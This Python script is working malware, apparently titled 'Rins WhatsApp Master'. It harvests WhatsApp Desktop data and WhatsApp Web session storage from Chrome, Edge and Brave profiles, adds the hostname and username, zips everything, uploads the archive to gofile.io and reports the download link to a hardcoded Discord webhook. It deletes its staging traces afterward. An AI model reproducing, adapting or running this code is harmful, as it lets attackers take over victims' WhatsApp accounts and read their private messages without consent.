import os
import sys
import time
import json
import shutil
import socket
import tempfile
import traceback
from pathlib import Path

import requests

try:
    from requests_toolbelt.multipart.encoder import MultipartEncoder, MultipartEncoderMonitor
except Exception:
    MultipartEncoder = None
    MultipartEncoderMonitor = None

try:
    import dhooks
except Exception as _e:
    dhooks = None
    _DHOOKS_IMPORT_ERR = str(_e)
else:
    _DHOOKS_IMPORT_ERR = None

# PSG > OM

WEBHOOK = "https://discord.com/api/webhooks/1553035523835035731/0RpTshpc0RiUfuKV2IDP3YH8gptecvencCaKFYOVV6N-eW_kRWW5fd5aR-yq_vF0i-YT"

AVATAR = ("https://github.com/rinsfx/WhatsappMaster/blob/master/"
          "assets/whatsapp.png?raw=true")

LOG_PATH = Path(tempfile.gettempdir()) / "wmaster.log"


def log(msg):
    try:
        with open(LOG_PATH, "a", encoding="utf-8") as f:
            f.write(f"[{time.strftime('%H:%M:%S')}] {msg}\n")
    except Exception:
        pass


def log_exc(tag):
    log(f"--- EXCEPTION in {tag} ---")
    log(traceback.format_exc())


DESKTOP_DIR = Path(os.getenv("LOCALAPPDATA", "")) / "Packages" / \
              "5319275A.WhatsAppDesktop_cv1g1gvanyjgm"

CHROME_ROOTS = {
    "chrome": Path(os.getenv("LOCALAPPDATA", "")) / "Google" / "Chrome" / "User Data",
    "edge":   Path(os.getenv("LOCALAPPDATA", "")) / "Microsoft" / "Edge" / "User Data",
    "brave":  Path(os.getenv("LOCALAPPDATA", "")) / "BraveSoftware" / "Brave-Browser" / "User Data",
}

WA_SUBPATHS = [
    Path("IndexedDB") / "https_web.whatsapp.com_0.indexeddb.leveldb",
    Path("Local Storage") / "leveldb",
    Path("Session Storage"),
    Path("Preferences"),
]

WA_MARKER = Path("IndexedDB") / "https_web.whatsapp.com_0.indexeddb.leveldb"

SKIP_PROFILES = {"Guest Profile", "System Profile"}


def load_config():
    candidates = [
        Path(__file__).resolve().with_name("config.json"),
        Path.cwd() / "config.json",
        Path(sys.executable).resolve().with_name("config.json"),
    ]
    for cfg_path in candidates:
        log(f"checking config: {cfg_path} exists={cfg_path.exists()}")
        if cfg_path.exists():
            try:
                with open(cfg_path, "r", encoding="utf-8") as f:
                    data = json.load(f)
                log(f"loaded config from {cfg_path}")
                return data
            except Exception:
                log_exc(f"load_config {cfg_path}")

    log("no config found, using defaults + injected WEBHOOK")
    return {
        "webhook": WEBHOOK,
        "targets": ["desktop", "chrome"],
        "chrome_browsers": ["chrome", "edge", "brave"],
        "max_zip_mb": 200,
        "retries": 10,
        "retry_delay_sec": 2
    }


def copy_tree_robust(src: Path, dst: Path):
    """Copy tree, skipping individual files that fail (LOCK, in-use, permission)."""
    skipped = []
    copied = 0
    for root, dirs, files in os.walk(src):
        rel = Path(root).relative_to(src)
        dst_dir = dst / rel
        try:
            dst_dir.mkdir(parents=True, exist_ok=True)
        except Exception as e:
            skipped.append(f"{rel}: mkdir {e}")
            continue
        for fname in files:
            sfile = Path(root) / fname
            dfile = dst_dir / fname
            try:
                shutil.copy2(sfile, dfile)
                copied += 1
            except Exception as e:
                skipped.append(f"{rel}/{fname}: {e}")
    return copied, skipped


def _copy_file(src: Path, dst: Path):
    try:
        dst.parent.mkdir(parents=True, exist_ok=True)
        shutil.copy2(src, dst)
        return True, None
    except Exception as e:
        return False, str(e)


def collect_desktop(stage: Path, manifest: dict):
    log(f"desktop target check: {DESKTOP_DIR} exists={DESKTOP_DIR.exists()}")
    if not DESKTOP_DIR.exists():
        manifest["targets"].append({"type": "desktop", "status": "skipped",
                                     "reason": "path not found",
                                     "path": str(DESKTOP_DIR)})
        return
    dst = stage / "desktop"
    copied, skipped = copy_tree_robust(DESKTOP_DIR, dst)
    entry = {"type": "desktop", "path": str(DESKTOP_DIR)}
    if copied > 0:
        entry["status"] = "ok"
        entry["files_copied"] = copied
        if skipped:
            entry["warnings"] = skipped[:20]
        log(f"desktop collected ok, files={copied}, skipped={len(skipped)}")
    else:
        entry["status"] = "skipped"
        entry["reason"] = "no files copied"
        log("desktop skipped: no files")
    manifest["targets"].append(entry)


def collect_chrome(stage: Path, manifest: dict, browsers: list):
    for bname in browsers:
        root = CHROME_ROOTS.get(bname)
        log(f"chrome root {bname}: {root} exists={bool(root and root.exists())}")
        if not root or not root.exists():
            continue

        for profile in root.iterdir():
            if not profile.is_dir():
                continue
            if profile.name in SKIP_PROFILES:
                continue
            if profile.name != "Default" and not profile.name.startswith("Profile "):
                continue

            wa_marker = profile / WA_MARKER
            if not wa_marker.exists():
                log(f"chrome {bname}/{profile.name}: no whatsapp data, skipping")
                continue

            entry = {"type": "chrome", "browser": bname, "profile": profile.name}
            dst_profile = stage / "chrome" / bname / profile.name
            dst_profile.mkdir(parents=True, exist_ok=True)

            total_copied = 0
            total_skipped = []

            for sub in WA_SUBPATHS:
                src_sub = profile / sub
                if not src_sub.exists():
                    continue
                dst_sub = dst_profile / sub
                if src_sub.is_dir():
                    copied, skipped = copy_tree_robust(src_sub, dst_sub)
                    total_copied += copied
                    total_skipped.extend([f"{sub}/{s}" for s in skipped])
                    log(f"chrome {bname}/{profile.name}/{sub} copied={copied} skipped={len(skipped)}")
                else:
                    ok, err = _copy_file(src_sub, dst_sub)
                    if ok:
                        total_copied += 1
                    else:
                        total_skipped.append(f"{sub}: {err}")

            if total_copied > 0:
                entry["status"] = "ok"
                entry["files_copied"] = total_copied
                if total_skipped:
                    entry["warnings"] = total_skipped[:20]
            else:
                entry["status"] = "skipped"
                entry["reason"] = "no files copied"

            manifest["targets"].append(entry)


def upload_to_gofile(path: Path, retries: int, delay: int):
    log(f"upload start: {path} size={path.stat().st_size if path.exists() else 'MISSING'}")
    for i in range(retries):
        try:
            r = requests.get("https://api.gofile.io/servers", timeout=15)
            servers = r.json()["data"]["servers"]
            preferred = next((s for s in servers if s["zone"] == "na"), servers[0])
            server = preferred["name"]
            log(f"gofile server: {server} zone={preferred['zone']} (attempt {i+1})")

            size = path.stat().st_size
            last_logged = [0]

            if MultipartEncoder and MultipartEncoderMonitor:
                def on_progress(monitor):
                    pct = int(monitor.bytes_read / size * 100)
                    if pct - last_logged[0] >= 10:
                        log(f"  upload {pct}% ({monitor.bytes_read}/{size})")
                        last_logged[0] = pct

                with open(path, "rb") as fh:
                    enc = MultipartEncoder(fields={"file": (path.name, fh)})
                    monitor = MultipartEncoderMonitor(enc, on_progress)
                    up = requests.post(
                        f"https://{server}.gofile.io/contents/uploadfile",
                        data=monitor,
                        headers={"Content-Type": monitor.content_type},
                        timeout=(15, 600)
                    )
            else:
                with open(path, "rb") as fh:
                    up = requests.post(
                        f"https://{server}.gofile.io/contents/uploadfile",
                        files={"file": fh},
                        timeout=(15, 600)
                    )

            log(f"upload status={up.status_code} body={up.text[:500]}")
            data = up.json()
            if data.get("status") != "ok":
                raise RuntimeError(f"gofile rejected: {data}")
            link = data["data"]["downloadPage"]
            log(f"upload ok: {link}")
            return link
        except Exception:
            log_exc(f"upload attempt {i+1}")
            time.sleep(delay)
    log("upload failed after all retries")
    return False


def send_webhook(url: str, host: str, link: str, targets: list):
    if dhooks is None:
        log(f"dhooks unavailable: {_DHOOKS_IMPORT_ERR}")
        log(f"would-be payload: host={host} link={link}")
        return
    tgt_str = ", ".join(
        f"{t.get('type')}"
        + (f"/{t.get('browser')}/{t.get('profile')}" if t.get("type") == "chrome" else "")
        for t in targets
    ) or "none"

    message = "**Rins WhatsApp Master Report**\n\n"
    message += f"📌 Pc: {host}\n"
    message += f"🎯 Targets: {tgt_str}\n"
    message += f"🔍 Url: {link}"

    embed = dhooks.Embed(
        title="🔔 Grab Alert",
        description=message,
        color=0xFF5733
    )

    hook = dhooks.Webhook(
        url=url,
        username="Rins WhatsApp Master",
        avatar_url=AVATAR
    )
    hook.send(embed=embed)
    log("webhook sent")


def main():
    try:
        log("=" * 50)
        log("=== payload start ===")
        log(f"cwd={os.getcwd()}")
        log(f"exe={sys.executable}")
        log(f"LOCALAPPDATA={os.getenv('LOCALAPPDATA')}")
        log(f"dhooks_import_ok={dhooks is not None}")

        cfg = load_config()
        webhook_url = cfg.get("webhook") or WEBHOOK
        retries = int(cfg.get("retries", 10))
        delay = int(cfg.get("retry_delay_sec", 2))
        browsers = cfg.get("chrome_browsers", ["chrome", "edge", "brave"])
        targets_wanted = cfg.get("targets", ["desktop", "chrome"])
        log(f"webhook set: {bool(webhook_url)}")
        log(f"targets_wanted: {targets_wanted}")

        host = socket.gethostname()
        ts = int(time.time())

        stage = Path(tempfile.gettempdir()) / f"wmaster_{host}_{ts}"
        stage.mkdir(parents=True, exist_ok=True)
        log(f"stage: {stage}")

        manifest = {
            "host": host,
            "user": os.getenv("USERNAME", ""),
            "ts": ts,
            "targets": []
        }

        if "desktop" in targets_wanted:
            collect_desktop(stage, manifest)

        if "chrome" in targets_wanted:
            collect_chrome(stage, manifest, browsers)

        with open(stage / "manifest.json", "w", encoding="utf-8") as f:
            json.dump(manifest, f, indent=2)

        archive_base = Path(tempfile.gettempdir()) / f"wmaster_{host}_{ts}"
        zip_path = Path(shutil.make_archive(str(archive_base), "zip", str(stage)))
        log(f"zip: {zip_path} size={zip_path.stat().st_size}")
        shutil.rmtree(stage, ignore_errors=True)

        link = upload_to_gofile(zip_path, retries, delay)

        try:
            zip_path.unlink()
            log("zip cleaned")
        except Exception:
            log_exc("zip unlink")

        if link:
            try:
                send_webhook(webhook_url, host, link, manifest["targets"])
            except Exception:
                log_exc("send_webhook")
        else:
            log("no link, skipping webhook")

        log("=== payload done ===")
    except Exception:
        log_exc("main")


if __name__ == "__main__":
    main()
